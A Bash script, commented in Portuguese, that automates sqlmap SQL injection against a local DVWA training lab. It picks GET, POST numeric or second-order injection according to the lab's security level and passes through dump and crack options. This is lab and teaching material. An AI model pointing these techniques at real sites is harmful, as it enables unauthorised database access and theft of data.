#!/usr/bin/env bash
#
# Roda o SQLMap contra a pagina de SQLi do DVWA escolhendo a TECNICA conforme o
# nivel de seguranca atual (lido do cookie .dvwa-cookie):
#
#   low    -> parametro `id` via GET
#   medium -> parametro `id` via POST. O form usa um dropdown e aplica
#             mysqli_real_escape_string(), mas a injecao e NUMERICA (sem aspas),
#             entao o escape nao protege e o ataque ainda funciona.
#   high   -> injecao de SEGUNDO GRAU (second-order). O `id` e enviado por POST
#             para session-input.php (guarda em $_SESSION['id']) e o resultado
#             aparece em index.php. Usamos --second-url para o sqlmap ler a
#             resposta na pagina certa.
#   impossible -> cai no GET (a demo mostra o ataque sendo bloqueado).
#
# Os argumentos extras ($@) sao repassados ao sqlmap (ex.: --dbs, --dump,
# --answers="crack=Y" ...). Assim scan/dump/crack compartilham esta logica.
#
# Uso: bash scripts/sqlmap-attack.sh [args do sqlmap...]
#   Variaveis opcionais: BASE (default http://localhost:80), COOKIE_FILE.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BASE="${BASE:-http://localhost:80}"
COOKIE_FILE="${COOKIE_FILE:-.dvwa-cookie}"
# Resolve o cookie relativo a raiz do projeto se nao for caminho absoluto.
case "$COOKIE_FILE" in /*) ;; *) COOKIE_FILE="$ROOT/$COOKIE_FILE" ;; esac

[ -f "$COOKIE_FILE" ] || { echo "Cookie nao encontrado. Rode 'make setup' primeiro." >&2; exit 1; }

COOKIE="$(cat "$COOKIE_FILE")"
LEVEL="$(grep -oE 'security=[a-z]+' "$COOKIE_FILE" | cut -d= -f2 || true)"

case "$LEVEL" in
	medium)
		echo "[*] Nivel 'medium': atacando via POST (injecao numerica)."
		TARGET=(-u "$BASE/vulnerabilities/sqli/" --data="id=1&Submit=Submit")
		;;
	high)
		echo "[*] Nivel 'high': atacando via second-order (session-input.php -> index.php)."
		TARGET=(-u "$BASE/vulnerabilities/sqli/session-input.php" \
			--data="id=1&Submit=Submit" \
			--second-url="$BASE/vulnerabilities/sqli/")
		;;
	*)
		echo "[*] Nivel '${LEVEL:-low}': atacando via GET."
		TARGET=(-u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit")
		;;
esac

set -x
exec sqlmap "${TARGET[@]}" --cookie="$COOKIE" --batch "$@"
